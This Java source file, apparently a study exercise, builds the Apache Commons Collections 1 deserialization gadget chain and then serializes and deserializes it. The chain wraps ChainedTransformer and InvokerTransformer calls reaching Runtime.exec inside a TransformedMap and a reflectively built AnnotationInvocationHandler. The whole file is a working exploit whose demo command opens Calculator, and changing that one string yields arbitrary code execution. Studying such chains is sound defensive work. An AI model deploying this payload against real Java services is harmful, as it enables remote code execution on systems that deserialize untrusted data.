package commenCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

import static commenCollections1.CC1_Deserialize.deserialize;
import static commenCollections1.CC1_Serialize.serialize;

public class CC1_Test {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
//        利用反射获取
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHDLConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHDLConstructor.setAccessible(true);
        Object o = annotationInvocationHDLConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        deserialize("ser.bin");
    }
}
